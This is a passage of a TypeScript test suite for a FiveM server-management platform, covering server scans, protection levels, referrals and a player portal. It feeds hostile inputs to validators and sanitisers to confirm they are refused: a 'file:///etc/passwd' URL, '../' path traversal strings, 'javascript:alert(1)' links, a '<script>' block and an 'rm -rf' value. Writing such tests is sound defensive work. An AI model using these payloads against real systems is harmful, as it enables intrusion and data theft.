  assert.deepEqual([clean.facts.fiverax, clean.facts.framework, clean.facts.anticheats], [true, "Qbox", ["Fiverax"]]);
  assert.deepEqual(x.lockFindings(risky.findings).map((f) => Object.keys(f).sort().join(","))[0], "category,rule,severity,title");

  // A server hiding info.json: its convars are unknown, not reported as off.
  const hidden = x.analyzeExternal({ vars: {}, varsHidden: true, resources: null, players: null }, null);
  assert.deepEqual(hidden.findings.map((f) => f.rule).sort(), ["code_not_scanned", "hidden_resources"]);

  assert.equal(x.endpointFromListing({ Data: { connectEndPoints: ["https://abc-def.users.cfx.re/", "51.75.12.34:30120"] } }), "51.75.12.34:30120");
  assert.equal(x.endpointFromListing({ Data: { connectEndPoints: ["127.0.0.1:22"] } }), null);
  assert.equal(x.endpointFromListing(null), null);
  const scan = await import("../src/lib/external-scan");
  assert.deepEqual(scan.parseCitizenUrl("http://51.75.12.34:30120/"), { host: "51.75.12.34", port: 30120 });
  assert.deepEqual(scan.parseCitizenUrl("https://abc12-x9y8z7.users.cfx.re/"), { proxy: "https://abc12-x9y8z7.users.cfx.re" });
  assert.equal(scan.parseCitizenUrl("http://51.75.12.34/"), null); // port 80
  assert.equal(scan.parseCitizenUrl("file:///etc/passwd"), null);
  assert.equal(scan.parseCitizenUrl(null), null);
});

test("free scan: stored, the same server answered from cache for 10 min, rate limited per address", async () => {
  const scan = await import("../src/lib/external-scan");
  const data = { vars: { onesync_enabled: "true" }, resources: ["qb-core"], players: [] };
  let calls = 0;
  const fetcher = async () => { calls++; return data; };
  const who = { ipHash: scan.scanIpHash("203.0.114.9"), discordId: null };
  const t0 = new Date("2026-06-01T10:00:00Z");
  const first = await scan.runPublicScan("cfx.re/join/zzz111", who, { now: t0, fetcher });
  const again = await scan.runPublicScan("zzz111", who, { now: new Date(t0.getTime() + 5 * 60_000), fetcher });
  assert.equal(again.token, first.token);
  assert.equal(calls, 1);
  assert.equal((await scan.getPublicScan(first.token))?.report.facts.framework, "QBCore");
  assert.equal(await scan.getPublicScan("../../etc"), null);
  await assert.rejects(scan.runPublicScan("localhost", who, { now: t0, fetcher }), /invalid_target/);
  for (let i = 0; i < 7; i++) await scan.runPublicScan(`10${i}.20.30.40:30120`, who, { now: t0, fetcher });
  await assert.rejects(scan.runPublicScan("109.20.30.40:30120", who, { now: t0, fetcher }), /rate_limited/);
  // Another address is not limited.
  await scan.runPublicScan("109.20.30.40:30120", { ipHash: scan.scanIpHash("198.51.99.1"), discordId: null }, { now: t0, fetcher });
});

test("protection: levels only from verified checks, rules plan, server.cfg, kit resources pass the scanner and the Studio checks", async () => {
  const p = await import("../src/lib/protection-shared");
  const kit = await import("../src/lib/protection-kit");
  const now = new Date("2026-06-10T12:00:00Z");
  const day = (n: number) => new Date(now.getTime() - n * 86_400_000).toISOString();
  const base = {
    agentSeenAt: day(1), lastScan: { at: day(3), score: 85, critical: 0, high: 0 }, continuous: false, anticheatEnabled: true,
    alertsWebhook: true, guildLinked: true, antiraidEnabled: true, network: false
  };
  assert.equal(p.protectionLevel(p.protectionChecks(base, now)), "reinforced");
  assert.equal(p.protectionLevel(p.protectionChecks({ ...base, lastScan: { ...base.lastScan, score: 95 }, continuous: true, network: true }, now)), "fortress");
  assert.equal(p.protectionLevel(p.protectionChecks({ ...base, lastScan: { ...base.lastScan, critical: 1 } }, now)), "none");
  assert.equal(p.protectionLevel(p.protectionChecks({ ...base, lastScan: { ...base.lastScan, at: day(40) } }, now)), "none"); // stale scan
  assert.equal(p.protectionLevel(p.protectionChecks({ ...base, agentSeenAt: day(9) }, now)), "none");
  // A level needs every check below it: fortress items do not count without the reinforced ones.
  assert.equal(p.protectionLevel(p.protectionChecks({ ...base, antiraidEnabled: false, continuous: true, network: true, lastScan: { ...base.lastScan, score: 99 } }, now)), "protected");
  const next = p.nextStep(p.protectionChecks(base, now));
  assert.deepEqual([next?.level, next?.missing.map((c) => c.key)], ["fortress", ["score92", "continuous", "network"]]);

  const findings = [
    { rule: "exposed_webhook", category: "security", severity: "high", title: "w", detail: "", fix: "f1", resource: "shop" },
    { rule: "exposed_webhook", category: "security", severity: "high", title: "w", detail: "", fix: "f1", resource: "garage" },
    { rule: "remote_code", category: "security", severity: "critical", title: "b", detail: "", fix: "f2", resource: "evil" },
    { rule: "scripthook", category: "config", severity: "critical", title: "s", detail: "", fix: "f3" }
  ] as Parameters<typeof p.rulesPlan>[0];
  const plan = p.rulesPlan(findings, p.protectionChecks({ ...base, network: false }, now), now);
  assert.equal(plan.steps[0].impact, "high");
  assert.ok(plan.steps.some((s) => s.kit === "fvx_webhooks" && /shop, garage/.test(s.why)));
  assert.ok(plan.steps.some((s) => s.title === "Membre des bans partagés"));
  assert.match(plan.summary, /2 problèmes critiques/);
  assert.deepEqual(p.recommendKit(findings).find((k) => k.key === "fvx_webhooks"), { key: "fvx_webhooks", count: 2 });
  const cfg = p.hardeningCfg(["scripthook", "rcon"]);
  assert.match(cfg, /sv_scriptHookAllowed 0/);
  assert.ok(!/sv_pureLevel/.test(cfg));
  assert.match(p.hardeningCfg(null), /sv_pureLevel 1[\s\S]*ensure fvx_join_guard/);

  const parsed = p.parsePlan(JSON.stringify({ summary: "ok", steps: [{ title: "A", how: "B", impact: "high", page: "hack", kit: "rm -rf" }, { title: "", how: "x" }] }), now);
  assert.deepEqual(parsed?.steps.map((s) => [s.title, s.page, s.kit]), [["A", null, null]]);
  assert.equal(p.parsePlan("pas du json", now), null);

  for (const [key, res] of Object.entries(kit.KIT_FILES)) {
    const checks = m.shared.checkFiles(res.files);
    assert.deepEqual(checks.filter((c) => c.level === "error"), [], `${key}: studio checks`);
    for (const f of res.files.filter((x) => x.path.endsWith(".lua"))) {
      const found = m.auditRules.analyzeFile(f.path, f.content, f.path === "server.lua" ? "server" : "other").findings;
      assert.deepEqual(found.filter((x) => x.severity !== "info").map((x) => x.rule), [], `${key}/${f.path}: scanner`);
    }
    assert.doesNotThrow(() => m.shared.cleanFiles(res.files));
  }
  const embeds = p.embedCodes("https://fiverax.gg/", "neon-city-ab12");
  assert.equal(embeds.find((e) => e.key === "md")!.code, "[![Protégé par Fiverax](https://fiverax.gg/badge/neon-city-ab12.svg)](https://fiverax.gg/protection/neon-city-ab12)");
});

test("protection: badge off until turned on, public page without problems, kit installed (then updated) in the Studio", async () => {
  const protection = await import("../src/lib/protection");
  const { badgeSvg } = await import("../src/lib/badge-svg");
  const created = await m.servers.createServer({ name: "Badge City", guildId: "598700000000000001", createdBy: A });
  assert.ok(created.ok);
  const server = created.server;
  const badge = await protection.ensureBadge(server);
  assert.equal(badge.enabled, false);
  assert.match(badge.publicId, /^badge-city-[0-9a-f]{4}$/);
  assert.equal((await protection.ensureBadge(server)).publicId, badge.publicId);
  assert.equal(await protection.publicProtection(badge.publicId), null);

  await protection.setBadgeEnabled(server, { discordId: A }, true);
  const pub = await protection.publicProtection(badge.publicId, { countView: true });
  assert.deepEqual([pub?.name, pub?.level, pub?.score], ["Badge City", "none", null]);
  assert.ok(pub!.protections.includes("Anticheat actif")); // the anticheat is on by default
  assert.equal((await protection.ensureBadge(server)).views, 1);
  assert.equal(await protection.publicProtection("../x"), null);
  assert.match(badgeSvg(null), /vérification/);
  const svg = badgeSvg({ level: "reinforced", score: 88, checkedAt: "2026-06-01T10:00:00Z" });
  assert.match(svg, /Renforcé/);
  assert.match(svg, /88\/100/);
  assert.match(svg, /01\/06\/2026/);
  assert.match(badgeSvg({ level: "protected", score: 70, checkedAt: null }, "flat"), /height="20"/);

  const status = await protection.protectionStatus(server.id);
  assert.equal(status.level, "none");
  assert.equal(status.checks.find((c) => c.key === "agent")?.done, false);
  const plan = await protection.currentPlan(server.id, status);
  assert.equal(plan.source, "rules");
  assert.ok(plan.steps.some((s) => s.page === "settings"));

  const first = await protection.installKit(server.id, { discordId: A, username: "Owner" }, "fvx_join_guard");
  const second = await protection.installKit(server.id, { discordId: A, username: "Owner" }, "fvx_join_guard");
  assert.deepEqual([first.created, second.created, second.creationId], [true, false, first.creationId]);
  const creation = await m.studio.getCreation(server.id, first.creationId);
  assert.deepEqual([creation?.resource, creation?.files.map((f) => f.path)], ["fvx_join_guard", ["fxmanifest.lua", "server.lua", "README.md"]]);
  await m.servers.deleteServer(server.id);
  assert.equal(await db.get("SELECT 1 FROM protection_badges WHERE server_id = ?", [server.id]), undefined);
});

test("referrals: one referrer per server, no self-referral, validated once the server runs, days spent as featured slots", async () => {
  const ref = await import("../src/lib/referrals");
  const directory = await import("../src/lib/directory");
  const X = "100000000000000071";
  const Y = "100000000000000072";
  const a = await m.servers.createServer({ name: "Parrain RP", guildId: "598700000000000011", createdBy: X });
  const b = await m.servers.createServer({ name: "Filleul RP", guildId: "598700000000000012", createdBy: Y });
  const c = await m.servers.createServer({ name: "Autre de X", guildId: "598700000000000013", createdBy: X });
  assert.ok(a.ok && b.ok && c.ok);
  const [A1, B1, C1] = [a.server.id, b.server.id, c.server.id];
  const code = await ref.ensureCode(A1);
  assert.match(code, /^[a-z0-9]{8}$/);
  assert.equal(await ref.ensureCode(A1), code);
  assert.equal(await ref.countClick(code), true);
  assert.equal(await ref.countClick("nope!"), false);

  assert.equal(await ref.recordReferral(code, A1, Y), false); // itself
  assert.equal(await ref.recordReferral(code, C1, X), false); // its own creator
  assert.equal(await ref.recordReferral("zzzzzzzz", B1, Y), false); // unknown code
  assert.equal(await ref.recordReferral(code, B1, Y), true);
  assert.equal(await ref.recordReferral(code, B1, Y), false); // one referrer per server

  const t = new Date("2026-06-01T12:00:00Z");
  assert.equal(await ref.qualifyPending({}, t), 0);
  let view = await ref.referralOverview(A1, t);
  assert.deepEqual([view.clicks, view.balance, view.referrals[0].status, view.referrals[0].progress?.done], [1, 0, "pending", false]);

  // The referred server runs: agent connected and 5 different players.
  await db.run("INSERT INTO fivem_state (server_id, seen_at) VALUES (?, ?)", [B1, t.toISOString()]);
  for (let i = 1; i <= 5; i++) {
    await db.run("INSERT INTO player_sessions (server_id, player_id, external_id, started_at) VALUES (?, ?, ?, ?)", [B1, 9000 + i, `ref-${B1}-${i}`, t.toISOString()]);
  }
  assert.equal(await ref.qualifyPending({}, t), 1);
  assert.equal(await ref.qualifyPending({}, t), 0); // idempotent
  assert.equal(await ref.balanceOf(A1), 7);
  assert.equal(await ref.balanceOf(B1), 3);
  view = await ref.referralOverview(A1, t);
  assert.deepEqual([view.qualified, view.tier, view.referrals[0].status], [1, null, "qualified"]);
  assert.deepEqual((await ref.referralOverview(B1, t)).referredBy, { name: "Parrain RP", status: "qualified" });

  // Spending: the listing must be published; the balance is never overspent.
  await assert.rejects(ref.redeemDays(A1, { discordId: X }, 5, t), /listing_not_published/);
  await directory.saveListing(A1, { discordId: X }, {
    slug: "parrain-rp", name: "Parrain RP", tagline: "Le meilleur RP du coin", description: "x".repeat(100), logoUrl: "", bannerUrl: "", gallery: [],
    connect: "cfx.re/join/abc123", discord: "", website: "", tags: [], framework: "standalone", language: "fr", minAge: 0, showPlayers: true
  }, t);
  await directory.setPublished(A1, { discordId: X }, true, t);
  assert.deepEqual(await ref.redeemDays(A1, { discordId: X }, 5, t), { balance: 2 });
  await assert.rejects(ref.redeemDays(A1, { discordId: X }, 3, t), /not_enough_days/);
  const slots = await directory.featuredSlots(A1, t);
  assert.deepEqual(slots.map((s) => [s.source, (new Date(s.endsAt).getTime() - new Date(s.startsAt).getTime()) / 86_400_000]), [["referral", 5]]);

  // Pending referrals expire after 60 days.
  const d = await m.servers.createServer({ name: "Dormant RP", guildId: "598700000000000014", createdBy: "100000000000000073" });
  assert.ok(d.ok);
  assert.equal(await ref.recordReferral(code, d.server.id, "100000000000000073", t), true);
  await ref.qualifyPending({}, new Date(t.getTime() + 61 * 86_400_000));
  assert.equal((await ref.referralOverview(A1, t)).referrals.find((r) => r.name === "Dormant RP")?.status, "expired");

  for (const id of [A1, B1, C1, d.server.id]) await m.servers.deleteServer(id);
  assert.equal((await db.get<{ n: number }>("SELECT COUNT(*) AS n FROM referral_ledger WHERE server_id IN (?, ?)", [A1, B1]))?.n, 0);
});

// ---- server player portal ----

test("server portal: designs are cleaned (unknown blocks, unsafe links), answers are checked against the questions", async () => {
  const ps = await import("../src/lib/portal-site-shared");
  const design = ps.cleanDesign({
    title: "  Neon  ", accent: "#ABCDEF", banner: "javascript:alert(1)", logo: "http://insecure.png",
    blocks: [
      { id: "a", type: "buttons", p: { items: [{ label: "Discord", url: "discord.gg/neon" }, { label: "Évil", url: "javascript:alert(1)" }, { label: "Join", url: "cfx.re/join/abc123" }] } },
      { id: "a", type: "hero", p: {} },
      { type: "script", p: { code: "<script>" } },
      { id: "g", type: "giveaway", p: { winners: 999, minHours: -5, rewardType: "money", rewardAccount: "bank", rewardAmount: 2500 } }
    ]
  });
  assert.deepEqual([design.title, design.accent, design.banner, design.logo], ["Neon", "#abcdef", "", ""]);
  assert.deepEqual(design.blocks.map((b) => b.type), ["buttons", "hero", "giveaway"]);
  assert.notEqual(design.blocks[1].id, "a"); // duplicate ids are renamed
  assert.deepEqual((design.blocks[0].p.items as { url: string }[]).map((i) => i.url), ["https://discord.gg/neon", "", "https://cfx.re/join/abc123"]);
  assert.deepEqual([design.blocks[2].p.winners, design.blocks[2].p.minHours], [20, 0]);
  assert.deepEqual(ps.giveawayReward(design.blocks[2]), { type: "money", account: "bank", amount: 2500 });
  assert.equal(ps.giveawayReward(ps.newBlock("giveaway")), null);
  assert.equal(ps.starterDesign("Neon City").blocks[0].p.title, "Bienvenue sur Neon City");

  const form = ps.cleanBlock({ type: "form", p: { questions: [
    { label: "Âge", type: "number", required: "1" }, { label: "Job", type: "select", options: "Police, EMS", required: "" }, { label: "Majeur ?", type: "yesno", required: "1" }, { label: "", type: "text" }
  ] } })!;
  const qs = ps.formQuestions(form);
  assert.deepEqual(qs.map((q) => [q.label, q.type, q.required, q.options]), [["Âge", "number", true, []], ["Job", "select", false, ["Police", "EMS"]], ["Majeur ?", "yesno", true, []]]);
  assert.deepEqual(ps.checkAnswers(qs, ["19", "", "Oui"]), ["19", "", "Oui"]);
  assert.throws(() => ps.checkAnswers(qs, ["", "", "Oui"]), /answer_required:0/);
  assert.throws(() => ps.checkAnswers(qs, ["dix-neuf", "", "Oui"]), /answer_number:0/);
  assert.throws(() => ps.checkAnswers(qs, ["19", "Pompier", "Oui"]), /answer_choice:1/);
  assert.throws(() => ps.checkAnswers(qs, ["19", "", "Peut-être"]), /answer_choice:2/);
});

test("server portal: draft then published page, forms answered once and decided by the staff, giveaways entered, drawn once, rewarded in game", async () => {
  const site = await import("../src/lib/portal-site");
  const ps = await import("../src/lib/portal-site-shared");
  const created = await m.servers.createServer({ name: "Portail City", guildId: "598700000000000021", createdBy: A });
  assert.ok(created.ok);
  const server = created.server;
  const staff = { discordId: A, username: "Owner" };
  const first = await site.ensureSite(server);
  assert.equal(first.slug, "portail-city");
  assert.equal(first.published, null);
  assert.equal(await site.getPublicPortal("portail-city", null), null); // not published yet

  const form = ps.newBlock("form");
  form.p.questions = [{ label: "Pseudo RP", type: "text", options: "", required: "1" }];
  form.p.minHours = 1;
  const giveaway = ps.newBlock("giveaway");
  Object.assign(giveaway.p, { title: "Voiture", minHours: 0, winners: 1, rewardType: "item", rewardItem: "car_key", rewardItemLabel: "Clé", rewardCount: 1, endsAt: "2026-07-01T20:00:00.000Z" });
  await site.saveDraft(server, staff, { ...first.draft, blocks: [ps.newBlock("hero"), form, giveaway] });
  await site.publishSite(server, staff);
  await assert.rejects(site.setSlug(server, staff, "api"), /invalid_slug/);
  await site.setSlug(server, staff, "neon-portal");
  assert.equal(await site.publishedSlug(server.id), "neon-portal");

  const player = { discordId: "100000000000000091", username: "Lucas", avatarUrl: null };
  const t = new Date("2026-06-20T12:00:00Z");
  let page = await site.getPublicPortal("neon-portal", player, {}, t);
  assert.deepEqual([page?.ctx.forms[form.id].reason, page?.ctx.giveaways[giveaway.id].reason, page?.ctx.stats?.linked], ["playtime", null, false]);
  await assert.rejects(site.submitForm("neon-portal", player, form.id, ["Lucas"], t), /form_playtime/);

  // The player plays 2 h on the server (Discord linked in FiveM).
  await agentCall(server.id, { events: [{ type: "join", session: "pp1", name: "Lucas", identifiers: ["license:pp1", `discord:${player.discordId}`], timestamp: Math.floor(t.getTime() / 1000) - 7200 }] }, t);
  await agentCall(server.id, { events: [{ type: "leave", session: "pp1", timestamp: Math.floor(t.getTime() / 1000) }] }, t);
  await assert.rejects(site.submitForm("neon-portal", player, form.id, [""], t), /answer_required/);
  await assert.rejects(site.submitForm("neon-portal", player, "nope", ["x"], t), /unknown_block/);
  const responseId = await site.submitForm("neon-portal", player, form.id, ["Lucas Moreau"], t);
  await assert.rejects(site.submitForm("neon-portal", player, form.id, ["Encore"], t), /form_once/);
  const [resp] = await site.listResponses(server.id);
  assert.deepEqual([resp.id, resp.username, resp.answers, resp.playSeconds], [responseId, "Lucas", [{ question: "Pseudo RP", answer: "Lucas Moreau" }], 7200]);
  await site.decideResponse(server.id, staff, responseId, "accepted", "Bienvenue dans l'équipe !");
  assert.equal(await site.countNewResponses(server.id), 0);
  page = await site.getPublicPortal("neon-portal", player, {}, t);
  assert.deepEqual(page?.ctx.forms[form.id].responses.map((r) => [r.status, r.reply]), [["accepted", "Bienvenue dans l'équipe !"]]);
  assert.equal(page?.ctx.stats?.playSeconds, 7200);

  // Giveaway: entries, leaving, the draw happens once (tick at the end date), the winner's reward waits for them in game.
  const other = { discordId: "100000000000000092", username: "Nina", avatarUrl: null };
  assert.equal((await site.enterGiveaway("neon-portal", player, giveaway.id, t)).entered, true);
  await site.enterGiveaway("neon-portal", other, giveaway.id, t);
  await site.leaveGiveaway("neon-portal", other, giveaway.id, t);
  assert.equal((await site.getPublicPortal("neon-portal", null, {}, t))?.ctx.giveaways[giveaway.id].entries, 1);
  assert.equal(await site.drawDueGiveaways(t), 0); // not ended yet
  const end = new Date("2026-07-01T21:00:00Z");
  await assert.rejects(site.enterGiveaway("neon-portal", other, giveaway.id, end), /giveaway_closed/);
  assert.equal(await site.drawDueGiveaways(end), 1);
  assert.equal(await site.drawDueGiveaways(end), 0);
  await assert.rejects(site.drawGiveaway(server.id, staff, giveaway.id, end), /giveaway_drawn/);
  page = await site.getPublicPortal("neon-portal", player, {}, end);
  assert.deepEqual([page?.ctx.giveaways[giveaway.id].drawn, page?.ctx.giveaways[giveaway.id].won, page?.ctx.giveaways[giveaway.id].winners], [true, true, ["Lucas"]]);
  const [g] = await site.giveawaysForStaff(server);
  assert.deepEqual([g.entries, g.winners.map((w) => [w.username, w.reward])], [1, [["Lucas", "pending"]]]);

  // Lucas comes back in game: after a minute, the agent gets the reward command, then confirms it.
  const back = new Date(end.getTime() + 3600_000);
  const ts = Math.floor(back.getTime() / 1000);
  await agentCall(server.id, {
    events: [{ type: "join", session: "pp2", name: "Lucas", identifiers: ["license:pp1", `discord:${player.discordId}`], timestamp: ts - 120 }],
    state: { hostname: "x", maxClients: 8, uptime: 1, players: [{ id: 7, name: "Lucas", session: "pp2", ping: 10 }], resources: [] }
  }, back);
  const handed = await agentCall(server.id, {}, back);
  assert.equal(handed.commands.length, 1);
  assert.deepEqual([handed.commands[0].kind, handed.commands[0].payload.target], ["game", 7]);
  assert.match(JSON.stringify(handed.commands[0].payload), /car_key/);
  assert.equal(m.agent.COMMANDS.game.schema.safeParse(handed.commands[0].payload).success, true);
  await agentCall(server.id, { results: [{ id: handed.commands[0].id, ok: true, message: "ok" }] }, back);
  assert.deepEqual((await site.giveawaysForStaff(server))[0].winners.map((w) => w.reward), ["delivered"]);

  await site.unpublishSite(server, staff);
  assert.equal(await site.getPublicPortal("neon-portal", null), null);
  assert.ok(await site.getPublicPortal("neon-portal", null, { draft: true }));
  await m.servers.deleteServer(server.id);
  assert.equal(await db.get("SELECT 1 FROM portal_form_responses WHERE server_id = ?", [server.id]), undefined);
});
